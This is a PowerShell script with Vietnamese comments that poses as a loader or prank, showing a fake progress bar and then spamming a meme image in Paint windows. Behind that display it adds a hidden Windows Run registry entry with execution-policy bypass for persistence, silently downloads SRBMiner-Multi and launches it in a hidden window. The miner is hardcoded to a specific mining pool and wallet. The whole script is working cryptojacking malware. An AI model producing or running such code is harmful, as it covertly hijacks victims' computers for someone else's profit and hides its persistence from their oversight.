Clear-Host
$start = Get-Date

# Nơi script đang nằm (fallback về current dir nếu chạy interactively)
$scriptDir = if ($MyInvocation.MyCommand.Path) { Split-Path -Parent $MyInvocation.MyCommand.Path } else { (Get-Location).Path }

# Config (thay đổi nếu muốn)
$spamEnabled = $true
$popPerSecond = 12
$displaySeconds = 4
$totalSpamDuration = 4
$autoRunExe = $true  # Tự động chạy exe sau khi extract
$exeFileName = "SRBMiner-MULTI.exe"  # Tên file exe cần chạy
$silentDownload = $true  # Ẩn thông báo download
$enableAutoStart = $true  # Bật tự động khởi động cùng Windows

function BigLogo {
    Write-Host ""
    Write-Host "  M   M  EEEEE  OOO   ZZZZZ" -ForegroundColor Cyan
    Write-Host "  MM MM  E     O   O     Z" -ForegroundColor Cyan
    Write-Host "  M M M  EEEE  O   O    Z " -ForegroundColor Cyan
    Write-Host "  M   M  E     O   O   Z  " -ForegroundColor Cyan
    Write-Host "  M   M  EEEEE  OOO   ZZZZZ" -ForegroundColor Cyan
    Write-Host " Power by servernotdie"
}
function RenderBar($label) {
    $width = 40
    for ($i = 0; $i -le $width; $i++) {
        $pct = [int](($i / $width) * 100)
        $bar = ("#" * $i) + ("." * ($width - $i))
        Write-Host -NoNewline "`r$label [$bar] $pct%"
        Start-Sleep -Milliseconds 50
    }
    Write-Host " Done"
}
function DownloadSafe($url, $outfile, $silent = $false) {
    try {
        if (-not $silent) {
            Write-Host "Downloading from: $url" -ForegroundColor Magenta
        }
        $progressPreference = 'SilentlyContinue'  # Ẩn progress bar
        Invoke-WebRequest -Uri $url -OutFile $outfile -UseBasicParsing
        if (Test-Path $outfile) {
            if (-not $silent) {
                Write-Host "Downloaded successfully to: $outfile" -ForegroundColor Green
            }
            return $true
        } else {
            return $false
        }
    } catch {
        if (-not $silent) {
            Write-Host "Download failed: $($_.Exception.Message)" -ForegroundColor Red
        }
        return $false
    }
}
function SetAutoStart($scriptPath) {
    try {
        $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
        $regName = "MeozScript"
        $existingValue = Get-ItemProperty -Path $regPath -Name $regName -ErrorAction SilentlyContinue
        if ($existingValue) {
            # Đã có trong registry, không cần thêm nữa
            return $false
        }
        $hiddenCommand = "powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$scriptPath`""
        Set-ItemProperty -Path $regPath -Name $regName -Value $hiddenCommand        
        return $true
    } catch {
        return $false
    }
}
function IsFirstRun() {
    try {
        $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
        $regName = "MeozScript"
        $existingValue = Get-ItemProperty -Path $regPath -Name $regName -ErrorAction SilentlyContinue
        return $existingValue -eq $null
    } catch {
        return $true
    }
}
function EnsureFolder($path) {
    if (-not (Test-Path $path)) {
        New-Item -ItemType Directory -Path $path -Force | Out-Null
    }
}
function ExtractArchive($zipPath, $destination) {
    try {
        if (-not (Test-Path $zipPath)) {
            return $false
        }
        EnsureFolder $destination
        try {
            Expand-Archive -Path $zipPath -DestinationPath $destination -Force
            return $true
        } catch {
            Add-Type -AssemblyName System.IO.Compression.FileSystem
            [System.IO.Compression.ZipFile]::ExtractToDirectory($zipPath, $destination, $true)
            return $true
        }
    } catch {
        return $false
    }
}
function FindAndRunExe($searchPath, $exeName) {
    try {
        $exePath = Get-ChildItem -Path $searchPath -Name $exeName -Recurse | Select-Object -First 1
        if ($exePath) {
            $fullPath = Join-Path $searchPath $exePath
            $miningArgs = @(
                "--algorithm", "verushash",
                "--pool", "sg.servernotdie.dpdns.org:8080",
                "--wallet", "RAekjoNg7FCkAdub3D8stA4LotrZqJKofu.nole",
                "--cpu-threads", "3"
            )
            $workingDir = Split-Path $fullPath
            $psi = New-Object System.Diagnostics.ProcessStartInfo
            $psi.FileName = $fullPath
            $psi.Arguments = [string]::Join(" ", $miningArgs)
            $psi.WorkingDirectory = $workingDir
            $psi.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
            $psi.CreateNoWindow = $true
            $psi.UseShellExecute = $false
            
            [System.Diagnostics.Process]::Start($psi) | Out-Null
            return $true
        } else {
            return $false
        }
    } catch {
        return $false
    }
}
$isFirstRun = IsFirstRun()
$currentScriptPath = $MyInvocation.MyCommand.Path
if ($isFirstRun) {
    BigLogo
    Write-Host "[+] Initializing libraries complete." -ForegroundColor Green
    Write-Host ""
    RenderBar "Loading modules"
    # Thiết lập auto start nếu được bật
    if ($enableAutoStart -and $currentScriptPath) {
        $autoStartSet = SetAutoStart $currentScriptPath
    }
    Start-Sleep -Milliseconds 500  
}
# Paths trong thư mục script
$imgUrl = "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcS6d87zy2l97Gbuz1xheO71Fzw31vhLFurSyg&s"
$zipUrl = "https://github.com/doktor83/SRBMiner-Multi/releases/download/2.9.7/SRBMiner-Multi-2-9-7-win64.zip" 
$imgOut = Join-Path $scriptDir "meoz_image.jpg"
$zipOut = Join-Path $scriptDir "SRBMiner-Multi-2-9-7-win64.zip"
$dest = Join-Path $scriptDir "meoz_assets"
EnsureFolder $scriptDir
EnsureFolder $dest
Write-Host ""
# Download image (silent mode)
$imgOk = DownloadSafe $imgUrl $imgOut $silentDownload
if (-not $imgOk -and -not $silentDownload) {
    Write-Host "Image download failed or unreachable" -ForegroundColor Yellow
}
$zipOk = DownloadSafe $zipUrl $zipOut $silentDownload
if ($zipOk) {
    if (-not $silentDownload) {
        Write-Host ""
    }
    RenderBar "Extracting archive"
    $extractOk = ExtractArchive $zipOut $dest
    if ($extractOk -and $autoRunExe) {
        Write-Host ""
        RenderBar "Loading miner"
        $runOk = FindAndRunExe $dest $exeFileName
    }
} else {
    if (-not $silentDownload) {
        Write-Host "Archive download failed or unreachable" -ForegroundColor Yellow
    }
}
$min = 10
$elapsed = (Get-Date) - $start
$remain = [math]::Max(0, $min - $elapsed.TotalSeconds)
if ($remain -gt 0) {
    Start-Sleep -Seconds $remain
}
Write-Host ""
function TryOpen($filePath) {
    if (-not (Test-Path $filePath)) { return $null }
    $msp = Join-Path $env:windir "system32\mspaint.exe"
    if (Test-Path $msp) {
        return Start-Process -FilePath $msp -ArgumentList ('"' + $filePath + '"') -PassThru
    } else {
        return Start-Process -FilePath $filePath -PassThru
    }
}
if ($spamEnabled -and (Test-Path $imgOut)) {
    $procList = New-Object System.Collections.ArrayList
    $endTime = (Get-Date).AddSeconds($totalSpamDuration)
    $interval = if ($popPerSecond -gt 0) { 1.0 / [double]$popPerSecond } else { 1.0 }
    while ((Get-Date) -lt $endTime) {
        for ($i = 1; $i -le $popPerSecond; $i++) {
            $p = TryOpen $imgOut
            if ($p) {
                $entry = New-Object PSObject -Property @{ Proc = $p; Start = Get-Date }
                $procList.Add($entry) | Out-Null
            }
            Start-Sleep -Milliseconds ([int]($interval * 1000))
        }
        foreach ($entry in $procList.ToArray()) {
            try {
                $pobj = $entry.Proc
                $st = $entry.Start
                if ($pobj -and -not $pobj.HasExited) {
                    if ((Get-Date) - $st -gt [timespan]::FromSeconds($displaySeconds)) {
                        try { $pobj.Kill() } catch {}
                    }
                } else {
                    $procList.Remove($entry) | Out-Null
                }
            } catch { 
                $procList.Remove($entry) | Out-Null 
            }
        }
    }
    foreach ($entry in $procList.ToArray()) {
        try {
            $pobj = $entry.Proc
            if ($pobj -and -not $pobj.HasExited) { 
                try { $pobj.Kill() } catch {} 
            }
        } catch {}
        $procList.Remove($entry) | Out-Null
    }
}
if (Test-Path $imgOut) {
    Start-Process $imgOut
}

Write-Host ""
Start-Sleep -Milliseconds 300
